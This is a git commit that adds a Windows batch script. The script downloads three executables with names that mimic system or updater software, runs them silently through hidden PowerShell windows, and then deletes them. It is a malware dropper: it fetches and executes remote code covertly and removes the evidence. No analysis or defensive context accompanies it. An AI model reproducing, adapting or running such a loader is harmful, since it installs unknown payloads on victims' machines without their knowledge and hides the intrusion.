815e41c6991d0b3826cca52d2521bae26294180c
blechbleh <blueyyy@yooblueyyy.info>
2025-11-30 11:06:28 -0800

    Add files via upload

---
+++ penis.bat
@@ -0,0 +1,45 @@
+@echo off
+setlocal
+
+:: -------------------------
+:: EXE URLs
+:: -------------------------
+set EXE_URL1=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Primeclientautoupdater.exe
+set EXE_URL2=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Windowssecurity.exe
+set EXE_URL3=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/ServiceHub.Main.exe
+
+:: -------------------------
+:: Filenames (match with URLs above)
+:: -------------------------
+set EXE_NAME1=Primeclientautoupdater.exe
+set EXE_NAME2=Windowssecurity.exe
+set EXE_NAME3=ServiceHub.Main.exe
+
+:: -------------------------
+:: Temp folder
+:: -------------------------
+set TEMP_DIR=%TEMP%\gt_temp
+
+if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"
+
+echo Downloading EXEs...
+
+:: Download each EXE if URL is defined
+if defined EXE_URL1 curl -L -o "%TEMP_DIR%\%EXE_NAME1%" %EXE_URL1%
+if defined EXE_URL2 curl -L -o "%TEMP_DIR%\%EXE_NAME2%" %EXE_URL2%
+if defined EXE_URL3 curl -L -o "%TEMP_DIR%\%EXE_NAME3%" %EXE_URL3%
+
+echo Running EXEs silently...
+
+:: Run each EXE if downloaded
+if exist "%TEMP_DIR%\%EXE_NAME1%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME1%' -WindowStyle Hidden"
+if exist "%TEMP_DIR%\%EXE_NAME2%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME2%' -WindowStyle Hidden"
+if exist "%TEMP_DIR%\%EXE_NAME3%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME3%' -WindowStyle Hidden"
+
+timeout /t 5 >nul
+
+echo Cleaning up...
+del "%TEMP_DIR%\*.exe" >nul 2>&1
+rd "%TEMP_DIR%" 2>nul
+
+echo Done.
